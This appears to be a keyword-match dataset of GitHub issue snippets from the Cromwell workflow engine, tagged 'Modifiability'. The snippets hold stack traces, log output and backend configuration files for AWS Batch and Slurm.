newcome",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354:1908,variab,variable,1908,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354,2,['variab'],['variable']
Modifiability,"r-ct1b0hjjpe9q.us-east-1.rds.amazonaws.com/cromwell; [2018-11-21 15:09:03,32] [info] Running with database db.url = jdbc:mysql://cromwell-db-rdscluster-6zlvcyvtarfq.cluster-ct1b0hjjpe9q.us-east-1.rds.amazonaws.com/cromwell; [2018-11-21 15:09:03,62] [warn] Unrecognized configuration key(s) for AwsBatch: auth, numCreateDefinitionAttempts, numSubmitAttempts; [2018-11-21 15:09:03,91] [info] Slf4jLogger started; [2018-11-21 15:09:04,16] [info] Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-23ba05a"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; [2018-11-21 15:09:04,43] [info] Metadata summary refreshing every 2 seconds.; [2018-11-21 15:09:04,51] [info] KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-11-21 15:09:04,53] [info] WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-11-21 15:09:04,60] [info] CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; [2018-11-21 15:09:05,40] [info] JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; [2018-11-21 15:09:05,44] [info] SingleWorkflowRunnerActor: Version 35; [2018-11-21 15:09:05,44] [info] SingleWorkflowRunnerActor: Submitting workflow; [2018-11-21 15:09:05,51] [info] Unspecified type (Unspecified version) workflow 02306258-436a-4372-ab54-2dcd83c42b47 submitted; [2018-11-21 15:09:05,52] [info] SingleWorkflowRunnerActor: Workflow submitted 02306258-436a-4372-ab54-2dcd83c42b47; [2018-11-21 15:09:05,53] [info] 1 new workflows fetched; [2018-11-21 15:09:05,53] [info] WorkflowManagerActor Starting workflow 02306258-436a-4372-ab54-2dcd83c42b47; [2018-11-21 15:09:05,54] [info] WorkflowManagerActor Successfully started WorkflowActor-02306258-436a-4372-ab54-2dcd83c42b47; [2018-11-21 15:09:05,54] [info] Retrieved 1 workflows from the WorkflowStoreActor; [2018-11-21 15:09:05,57] [info] WorkflowStoreHeartbeatWriteActor conf",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421:1294,config,configured,1294,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421,1,['config'],['configured']
Modifiability,"r.ActorCell.create(ActorCell.scala:669); 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:523); 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:545); 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:283); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: com.typesafe.config.ConfigException$Missing: No configuration setting found for key 'services'; 	at com.typesafe.config.impl.SimpleConfig.findKeyOrNull(SimpleConfig.java:156); 	at com.typesafe.config.impl.SimpleConfig.findOrNull(SimpleConfig.java:174); 	at com.typesafe.config.impl.SimpleConfig.find(SimpleConfig.java:188); 	at com.typesafe.config.impl.SimpleConfig.find(SimpleConfig.java:193); 	at com.typesafe.config.impl.SimpleConfig.getObject(SimpleConfig.java:268); 	at com.typesafe.config.impl.SimpleConfig.getObject(SimpleConfig.java:41); 	at cromwell.services.ServiceRegistryActor$.serviceNameToPropsMap(ServiceRegistryActor.scala:35); 	at cromwell.services.ServiceRegistryActor.serviceProps(ServiceRegistryActor.scala:63); 	at cromwell.services.ServiceRegistryActor.<init>(ServiceRegistryActor.scala:65); 	at cromwell.services.ServiceRegistryActor$.$anonfun$props$1(ServiceRegistryActor.scala:25); 	at akka.actor.TypedCreatorFunctionConsumer.produce(IndirectActorProducer.scala:87); 	at akka.actor.Props.newActor(Props.scala:212); 	at akka.actor.ActorCell.newActor(ActorCell.scala:624); 	at akka.actor.ActorCell.create(ActorCell.scala:650); 	... 9 common frames omitted; ```. I tried adding the [reference services block](https://github.com/broadinstitute/cromwell/blob/develop/core/src/main/resources/reference.conf#L480), but then I r",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881:1407,config,config,1407,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881,1,['config'],['config']
Modifiability,"r.ActorCell.invoke(ActorCell.scala:557); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258); 	at akka.dispatch.Mailbox.run(Mailbox.scala:225); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ```. I'm basically using the standard aws configuration file for Cromwell:. ```hocon; include required(classpath(""application"")). aws {; application-name = ""cromwell""; auths = [{; name = ""default""; scheme = ""default""; }]; region = ""ap-southeast-2""; }. engine { filesystems { s3 { auth = ""default"" } } }. backend {; default = ""AWSBATCH""; providers {; AWSBATCH {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; numSubmitAttempts = 3; numCreateDefinitionAttempts = 3; root = ""s3://$bucketName/cromwell-execution""; auth = ""default""; concurrent-job-limit = 16; default-runtime-attributes {; queueArn = ""arn:aws:batch:ap-southeast-2:$arn""; }; filesystems { s3 { auth = ""default"" } }; }; }; }; }; ```. I've contacted AWS Support, to find out if I could fully (region) qualify the S3 locator (something like [these examples](https://docs.aws.amazon.com/AmazonS3/latest/dev/UsingBucket.html#access-bucket-intro): `s3://us-east-1.amazonaws.com/broad-references/.../file`. . AWS basically said no, and they directed me towards https://github.com/aws/aws-sdk-java/issues/1366 (their aws-sdk-java) with an [`enableForceGlobalBucketAccess`](https://docs.aws.amazon.com/AWSJavaSDK/latest/javadoc/com/amazonaws/services/s3/AmazonS3Builder.html#enableForceGlobalBucketAccess--) option on a `AmazonS3Builder`. . I've tried to have a search through Cromwell to work out where this setting could be placed, but I'm a bit lost with project structure and Scala.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4731:3945,config,config,3945,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4731,1,['config'],['config']
Modifiability,"r.aroundReceive$(Actor.scala:515); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.aroundReceive(ConfigAsyncJobExecutionActor.scala:211); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:588); 	at akka.actor.ActorCell.invoke(ActorCell.scala:557); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258); 	at akka.dispatch.Mailbox.run(Mailbox.scala:225); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: scala.NotImplementedError: This should not happen, please report this; 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:281); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$pollStatusAsync$1(StandardAsyncExecutionActor.scala:697); 	at scala.util.Try$.apply(Try.scala:209); 	... 25 more. [2019-02-13 22:18:20,91] [error] WorkflowManagerActor Workflow bc35173d-fde7-4727-8ae1-d4d3f132296c failed (during ExecutingWorkflowState): java.util.concurrent.ExecutionException: Boxed Error; 	at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); 	at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); 	at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); 	at scala.concurrent.Promise$.fromTry(Promise.scala:138); 	at scala.concurrent.Future$.fromTry(Future.scala:635); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsy",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710:3448,config,config,3448,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710,1,['config'],['config']
Modifiability,"r.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: common.exception.AggregatedMessageException: Error(s):; Could not evaluate expression: ""-l h_vmem="" + memory + ""G"": Cannot perform operation: -l h_vmem= + WomLong(4); at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:77); at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:73); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.writeTaskScript(ConfigAsyncJobExecutionActor.scala:107); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.writeTaskScript$(ConfigAsyncJobExecutionActor.scala:55); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.writeTaskScript(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.processArgs(ConfigAsyncJobExecutionActor.scala:43); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.processArgs$(ConfigAsyncJobExecutionActor.scala:39); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.processArgs$lzycompute(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.processArgs(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.makeProcessRunner(SharedFileSystemAsyncJobExecutionActor.scala:174); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.makeProcessRunner$(SharedFileSystemAsyncJobExecutionActor.scala:171); at cromwell.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4659:2153,config,config,2153,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4659,1,['config'],['config']
Modifiability,"r.scala:983); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.poll(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustPoll$1(AsyncBackendJobExecutionActor.scala:76); 	at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:61); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustPoll(AsyncBackendJobExecutionActor.scala:76); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$receive$1.applyOrElse(AsyncBackendJobExecutionActor.scala:89); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); 	at akka.actor.Actor.aroundReceive(Actor.scala:517); 	at akka.actor.Actor.aroundReceive$(Actor.scala:515); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.aroundReceive(ConfigAsyncJobExecutionActor.scala:211); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:588); 	at akka.actor.ActorCell.invoke(ActorCell.scala:557); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258); 	at akka.dispatch.Mailbox.run(Mailbox.scala:225); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: scala.NotImplementedError: This should not happen, please report this; 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:281); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobE",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710:2516,config,config,2516,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710,2,['config'],['config']
Modifiability,"r; 	at cromwell.CromwellApp$.runCromwell(CromwellApp.scala:14); 	at cromwell.CromwellApp$.delayedEndpoint$cromwell$CromwellApp$1(CromwellApp.scala:25); 	at cromwell.CromwellApp$delayedInit$body.apply(CromwellApp.scala:3); 	at scala.Function0.apply$mcV$sp(Function0.scala:34); 	at scala.Function0.apply$mcV$sp$(Function0.scala:34); 	at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala:12); 	at scala.App.$anonfun$main$1$adapted(App.scala:76); 	at scala.collection.immutable.List.foreach(List.scala:389); 	at scala.App.main(App.scala:76); 	at scala.App.main$(App.scala:74); 	at cromwell.CromwellApp$.main(CromwellApp.scala:3); 	at cromwell.CromwellApp.main(CromwellApp.scala); Caused by: com.typesafe.config.ConfigException$Parse: /data/cephfs/punim0751/spartan.conf: 27: expecting a close parentheses ')' here, not: end of file; 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseError(ConfigDocumentParser.java:201); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseError(ConfigDocumentParser.java:197); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseKey(ConfigDocumentParser.java:279); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseObject(ConfigDocumentParser.java:450); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseValue(ConfigDocumentParser.java:247); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parseObject(ConfigDocumentParser.java:458); 	at com.typesafe.config.impl.ConfigDocumentParser$ParseContext.parse(ConfigDocumentParser.java:648); 	at com.typesafe.config.impl.ConfigDocumentParser.parse(ConfigDocumentParser.java:14); 	at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:260); 	at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:248); 	at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:180); 	at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:174); 	at com.typesafe.config.impl.Parseable",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4549:1849,Config,ConfigDocumentParser,1849,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4549,1,['Config'],['ConfigDocumentParser']
Modifiability,r; at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); at scala.concurrent.Promise$.fromTry(Promise.scala:138); at scala.concurrent.Future$.fromTry(Future.scala:635); at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:691); at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync$(StandardAsyncExecutionActor.scala:691); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatusAsync(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.standard.StandardAsyncExecutionActor.poll(StandardAsyncExecutionActor.scala:983); at cromwell.backend.standard.StandardAsyncExecutionActor.poll$(StandardAsyncExecutionActor.scala:977); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.poll(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustPoll$1(AsyncBackendJobExecutionActor.scala:76); at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:61); at cromwell.backend.async.AsyncBackendJobExecutionActor.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustPoll(AsyncBackendJobExecutionActor.scala:76); at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$receive$1.applyOrElse(AsyncBackendJobExecutionActor.scala:89); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); at akka.actor.Actor.aroundReceive(Actor.scala:517); at akka.actor.Actor.aroundReceive$(Actor.scala:515); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.aroundReceive(ConfigAsyncJobExecutionActor.scala:211); at akka.actor.Actor,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345:2206,Config,ConfigAsyncJobExecutionActor,2206,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,"rCell.create(ActorCell.scala:650) ; ... 9 more ; ```. If I add in a `services` stanza, though, it asks me to define the class of each service, even though they should probably have default values:; ```; [ERROR] [01/24/2019 11:09:59.741] [cromwell-system-akka.dispatchers.service-dispatcher-10] [akka://cromwell-system/user/SingleWorkflowRunnerActor/ServiceRegistryActor] Received ServiceRegistryMessage requ; esting service 'LoadController' for which no service is configured. Message: LoadMetric(NonEmptyList(CallCacheWriteActor),NormalLoad) ; [ERROR] [01/24/2019 11:09:59.731] [cromwell-system-akka.dispatchers.service-dispatcher-10] [akka://cromwell-system/user/SingleWorkflowRunnerActor/ServiceRegistryActor] Received ServiceRegistryMessage requ; esting service 'Instrumentation' for which no service is configured. Message: InstrumentationServiceMessage(CromwellGauge(CromwellBucket(List(job),NonEmptyList(callcaching, read, $y, queue)),0)); ```. ***. Here's my config file for Cromwell 36 (that works):; ```; backend {; default = spartan. providers {; spartan {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; Int runtime_minutes = 600; Int cpus = 2; Int requested_memory_mb_per_core = 8000; String? docker; """""". submit = """"""; sbatch -J ${job_name} -D ${cwd} -o ${out} -e ${err} -t ${runtime_minutes} \; ${""-c "" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --wrap ""/bin/bash ${script}""; """""". submit-docker = """"""; module load Singularity/2.5.0-intel-2017.u2 || true; singularity pull docker://${docker}; sbatch -J ${job_name} -D ${cwd} -o ${out} -e ${err} -t ${runtime_minutes} \; ${""-c "" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --wrap ""singularity exec -B ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${script}"" ; """""". kill = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*""; }; }; }; }; ```. Here's what I added to my c",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4577:3460,config,config,3460,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4577,1,['config'],['config']
Modifiability,rThread.java:107); 11:09:46 cromwell-test_1 | Caused by: liquibase.exception.LockException: java.lang.NullPointerException; 11:09:46 cromwell-test_1 | 	at liquibase.lockservice.StandardLockService.acquireLock(StandardLockService.java:242); 11:09:46 cromwell-test_1 | 	at liquibase.lockservice.StandardLockService.waitForLock(StandardLockService.java:170); 11:09:46 cromwell-test_1 | 	at liquibase.Liquibase.update(Liquibase.java:196); 11:09:46 cromwell-test_1 | 	at liquibase.Liquibase.update(Liquibase.java:192); 11:09:46 cromwell-test_1 | 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:58); 11:09:46 cromwell-test_1 | 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:31); 11:09:46 cromwell-test_1 | 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1(ServicesStore.scala:11); 11:09:46 cromwell-test_1 | 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1$adapted(ServicesStore.scala:11); 11:09:46 cromwell-test_1 | 	at cromwell.database.slick.SlickDatabase.$anonfun$withConnection$1(SlickDatabase.scala:96); 11:09:46 cromwell-test_1 | 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:70); 11:09:46 cromwell-test_1 | 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:69); 11:09:46 cromwell-test_1 | 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275); 11:09:46 cromwell-test_1 | 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 11:09:46 cromwell-test_1 | 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 11:09:46 cromwell-test_1 | 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 11:09:46 cromwell-test_1 | 	at java.lang.Thread.run(Thread.java:748); 11:09:46 cromwell-test_1 | Caused by: java.lang.NullPointerException: null; 11:09:46 cromwell-test_1 | 	at liquibase.sqlgenerator.SqlGenera,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4328#issuecomment-434037766:4339,adapt,adapted,4339,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4328#issuecomment-434037766,1,['adapt'],['adapted']
Modifiability,r] No configuration setting found for key 'services' ; akka.actor.ActorInitializationException: akka://cromwell-system/user/SingleWorkflowRunnerActor/ServiceRegistryActor: exception during creation ; at akka.actor.ActorInitializationException$.apply(Actor.scala:193) ; at akka.actor.ActorCell.create(ActorCell.scala:669) ; at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:523) ; at akka.actor.ActorCell.systemInvoke(ActorCell.scala:545) ; at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:283) ; at akka.dispatch.Mailbox.run(Mailbox.scala:224) ; at akka.dispatch.Mailbox.exec(Mailbox.scala:235) ; at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) ; at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) ; at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) ; at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) ; Caused by: com.typesafe.config.ConfigException$Missing: No configuration setting found for key 'services' ; at com.typesafe.config.impl.SimpleConfig.findKeyOrNull(SimpleConfig.java:156) ; at com.typesafe.config.impl.SimpleConfig.findOrNull(SimpleConfig.java:174) ; at com.typesafe.config.impl.SimpleConfig.find(SimpleConfig.java:188) ; at com.typesafe.config.impl.SimpleConfig.find(SimpleConfig.java:193) ; at com.typesafe.config.impl.SimpleConfig.getObject(SimpleConfig.java:268) ; at com.typesafe.config.impl.SimpleConfig.getObject(SimpleConfig.java:41) ; at cromwell.services.ServiceRegistryActor$.serviceNameToPropsMap(ServiceRegistryActor.scala:35) ; at cromwell.services.ServiceRegistryActor.serviceProps(ServiceRegistryActor.scala:63) ; at cromwell.services.ServiceRegistryActor.<init>(ServiceRegistryActor.scala:65) ; at cromwell.services.ServiceRegistryActor$.$anonfun$props$1(ServiceRegistryActor.scala:25) ; at akka.actor.TypedCreatorFunctionConsumer.produce(IndirectActorProducer.scala:87) ; at akka.actor.Props.newActor(Props.scala:212) ; at akka.actor.ActorCe,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4577:1398,Config,ConfigException,1398,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4577,2,"['Config', 'config']","['ConfigException', 'configuration']"
Modifiability,"race below). List of things I tried are:. - increasing the time limit but didn't work; - clearing db because db might have grown big but didn't work; - increasing max number of connections by increasing size of db but didn't work. Is it not possible to start two runs at the same time since cromwell db gets locked by the previous run until it is finished? If yes, is there any other way to do it?. PS: I understand that cromwell provides `server` mode where we can submit runs via REST API end points. However, we are working on HPC cluster where we don't have admin privileges to start server and submit requests to api. Backend: `slurm`; Workflow: [Link](https://github.com/biowdl/RNA-seq/blob/develop/RNA-seq.wdl). <details>; <summary>Config</summary>. ```; backend {. default = slurm. providers {; slurm {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; Int time_minutes = 600; Int cpu = 4; #Int memory = 500; String queue = ""short""; String map_path = ""/shared/rna-seq""; String partition = ""compute""; String root = ""/shared/rna-seq/cromwell-executions""; """""". # If an 'exit-code-timeout-seconds' value is specified:; # - check-alive will be run at this interval for every job; # - if a job is found to be not alive, and no RC file appears after this interval; # - Then it will be marked as Failed.; # Warning: If set, Cromwell will run 'check-alive' for every job at this interval. # exit-code-timeout-seconds = 120. submit = """"""; task=`echo ${job_name}|cut -d'_' -f3`; echo $task; image=`grep ""\b$task\b"" ${map_path}/map.txt |cut -d',' -f2`; echo $PWD; echo $image; if [ ! -z $image ]; then \; echo ""Inside Singularity exec""; \; echo ""CPU count: "" ${cpu}; \; echo ""time_minutes: "" ${time_minutes}; \; sbatch -J ${job_name} -D ${cwd} -c ${cpu} -o ${out} -e ${err} -t ${time_minutes} --wrap ""singularity exec -B /shared/rna-seq:/shared/rna-seq $image /bin/bash ${script}""; else \; echo ""No Singularity""; \; sbatch -J ${job",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6208:1030,Config,ConfigBackendLifecycleActorFactory,1030,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6208,2,"['Config', 'config']","['ConfigBackendLifecycleActorFactory', 'config']"
Modifiability,"ral scatter-gather blocks. We switched to a separate metadata database to address the Java heap problem that occurs with the in-memory database. We enabled debug logging to try and troubleshoot an unrelated problem. Most of the log output at the increased level is appears to be from HSQL. After running for about 8 hrs, the following error appears in the output and Cromwell hangs:; ```; Exception in thread ""Exec Stream Pumper"" java.lang.OutOfMemoryError: Required array length 2147483639 + 39 is too large; 	at java.base/jdk.internal.util.ArraysSupport.hugeLength(ArraysSupport.java:649); 	at java.base/jdk.internal.util.ArraysSupport.newLength(ArraysSupport.java:642); 	at java.base/java.io.ByteArrayOutputStream.ensureCapacity(ByteArrayOutputStream.java:100); 	at java.base/java.io.ByteArrayOutputStream.write(ByteArrayOutputStream.java:132); 	at org.apache.commons.io.output.ProxyOutputStream.write(ProxyOutputStream.java:92); 	at org.apache.commons.io.output.TeeOutputStream.write(TeeOutputStream.java:68); 	at org.apache.commons.exec.StreamPumper.run(StreamPumper.java:108); 	at java.base/java.lang.Thread.run(Thread.java:1623); ```. We are running Cromwell using Dockstore as a wrapper using the following command:; ```; dockstore workflow launch --local-entry BiobankScrubWorkflow.wdl --json inputs.json > dockstore.log 2>&1 &; ```. At the time the OOME occurs, the size of the dockstore.log file is approx 2147485425 bytes. Based on the ""Saving copy of Cromwell stdout to..."" messages at the end of a successful Cromwell run, it would appear that Cromwell is internally buffering the stdout and stderr streams to save at the end of the run. So when the size of the stdout or stderr exceeds the Java buffer max size, the OOME occurs. The Cromwell configuration we are using is the default with the exception of uncommenting the `database -> metadata` block and updating the docker run command to mount the local GCloud SDK configuration into the container to enable access to GCP resources.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7217:2027,config,configuration,2027,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7217,2,['config'],['configuration']
